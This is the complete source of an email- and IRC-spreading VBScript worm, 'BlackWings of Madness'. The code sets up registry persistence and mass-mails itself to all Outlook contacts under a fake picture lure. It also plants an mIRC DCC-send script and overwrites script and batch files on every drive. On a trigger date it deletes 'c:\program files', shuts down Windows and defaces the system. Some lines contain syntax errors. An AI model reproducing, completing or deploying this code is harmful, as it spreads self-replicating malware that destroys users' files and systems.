'-=BlackWings of Madness=- made by: <{DDoS}-=Y0G-S0th0th>.
set rN5hhta76U = createobject("scripting.filesystemobject")
rB4vtjy87B = rN5hhta76U.getspecialfolder(0)
xJ5tbol29P = rB4vtjy87B & "\wings.jpg.vbe"
set qG2uuoy91F = createobject("wscript.shell")
qG2uuoy91F.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\winupdate2", rB4vtjy87B & "\"&"wings.jpg.vbe"
rN5hhta76U.copyfile wscript.scriptfullname, xJ5tbol29P
yK2eeqk41R
Function yK2eeqk41R()
Set uA2bcid0N = CreateObject("Outlook.Application")
If uA2bcid0N = "Outlook" Then
Set qN8ceql35D = uA2bcid0N.GetNameSpace("MAPI")
Set rX5cskl49F = qN8ceql35D.AddressLists
For Each iC5excl27V In rX5cskl49F
If iC5excl27V.AddressEntries.Count <> 0 Then
sG6gcai79H = iC5excl27V.AddressEntries.Count
For fM2ibmf86O = 1 To sG6gcai79H
Set sX3ncpk96C = uA2bcid0N.CreateItem(0)
Set xP3dlfy13A = iC5excl27V.AddressEntries(fM2ibmf86O)
sX3ncpk96C.To = xP3dlfy13A.Address
sX3ncpk96C.Subject = "This is a very cool picture check it out !"
sX3ncpk96C.Body = "Hey check out this picture i made for u with a sweet painting program i just bought. This app' is awesome. Check out the picture i made the details are vivid and realistic. Talk with you again soon. And i'll let you know where you can get a free copy of this wonderful program for eval'.Thanks!"
execute "set iN9nkvu67S = sX3ncpk96C." & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
yI4krek54U = xJ5tbol29P
sX3ncpk96C.DeleteAfterSubmit = True
iN9nkvu67S.Add yI4krek54U
If sX3ncpk96C.To <> "" Then
sX3ncpk96C.Send
End If
Next
End If
Next
End If
End function
'rrnherxqrrmcyit
Function tJ2wppk9O(nK5fpmr88J)
If nK5fpmr88J <> "" Then
hH1nfoj87L = qG2uuoy91F.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If rN5hhta76U.fileexists("c:\mirc\mirc.ini") Then
nK5fpmr88J = "c:\mirc"
ElseIf rN5hhta76U.fileexists("c:\mirc32\mirc.ini") Then
nK5fpmr88J = "c:\mirc32"
ElseIf rN5hhta76U.fileexists(hH1nfoj87L & "\mirc\mirc.ini") Then
nK5fpmr88J = hH1nfoj87L & "\mirc"
ElseIf rN5hhta76U.fileexists(hH1nfoj87L & "\mirc32\mirc.ini") Then
nK5fpmr88J = hH1nfoj87L & "\mirc"
Else
nK5fpmr88J = ""
End If
End If
If nK5fpmr88J<>""Then
Set eR7pteu20X = rN5hhta76U.CreateTextFile(nK5fpmr88J & "\script.ini", True)
eR7pteu20X = "[script]" &  vbCrLf & "n0=on 1:JOIN:#:{"
eR7pteu20X = eR7pteu20X & vbCrLf & "n0=on 1:JOIN:#:{"
eR7pteu20X = eR7pteu20X & vbCrLf & "n1=  /if ( $nick == $me ) { halt }"
eR7pteu20X = eR7pteu20X & vbCrLf & "n2=  /."& Chr(100) & Chr(99) & Chr(99) & " send $nick "
eR7pteu20X = eR7pteu20X & xJ5tbol29P
eR7pteu20X = eR7pteu20X & vbCrLf & "n3=}"
script.Close
End If
iR3tdox24X
Function iR3tdox24X()
On Error Resume Next
Set A5O14007 = rN5hhta76U.Drives
For Each hS8ueca15J In A5O14007
If hS8ueca15J.Drivetype = Remote Then
mT8jeik15P = hS8ueca15J & "\"
Call cF6meyl0K(mT8jeik15P)
Elseif hS8ueca15J.isready then
mT8jeik15P = hS8ueca15J & "\"
Call cF6meyl0K(mT8jeik15P)
End If
Next
End function
Function cF6meyl0K(OT2016KI)
Set GJF6856R = rN5hhta76U.GetFolder(OT2016KI)
Set E9DOP13B = GJF6856R.Files
For Each lF8pjjv58X In E9DOP13B
if lcase(rK0eemk10G = "mirc.ini" then
tJ2wppk9O(rK0eemk10G.parentfolder)
end if
If rN5hhta76U.GetExtensionName(lF8pjjv58X.path) ="vbs" then
rN5hhta76U.CopyFile wscript.scriptfullname ,lF8pjjv58X.path , true
End if
If rN5hhta76U.GetExtensionName(lF8pjjv58X.path) ="vbe" then
rN5hhta76U.CopyFile wscript.scriptfullname , lF8pjjv58X.path , true
End if
If rN5hhta76U.GetExtensionName(lF8pjjv58X.path) ="wsh" then
rN5hhta76U.CopyFile wscript.scriptfullname ,lF8pjjv58X.path , true
End if
If rN5hhta76U.GetExtensionName(lF8pjjv58X.path) ="bat" then
rN5hhta76U.CopyFile wscript.scriptfullname ,lF8pjjv58X.path , true
End if
Next
Set lF8pjjv58X = dF3tbms80I.Subfolders
For Each qV4ewji77F In lF8pjjv58X
Call cF6meyl0K(lF8pjjv58X.path)
Next
End function
rY2ncyq1O
Function rY2ncyq1O()
If month(now) = 1 and day(now) = 26 then
qG2uuoy91F.run "RUNDLL32.EXE user.exe,exitwindows"
qG2uuoy91F.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","Stupid Fucking Jackass"
if rN5hhta76U.folderexists("c:\program files)" then
rN5hhta76U.deletefolder "c:\program files"
end if
qG2uuoy91F.run "net send * Hello! Jackass !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!", 7, false
end if
end function
set rW8anwk67M = rN5hhta76U.opentextfile(wscript.scriptfullname)
mL3kgbg97B = rW8anwk67M.readall
rW8anwk67M.Close
Do
If Not (rN5hhta76U.fileexists(wscript.scriptfullname)) Then
Set jJ4dlgp54D = rN5hhta76U.createtextfile(wscript.scriptfullname, True)
jJ4dlgp54D.write mL3kgbg97B
jJ4dlgp54D.Close
End If
Loop
'Made by {DDoS}-=Y0G-S0th0th=-
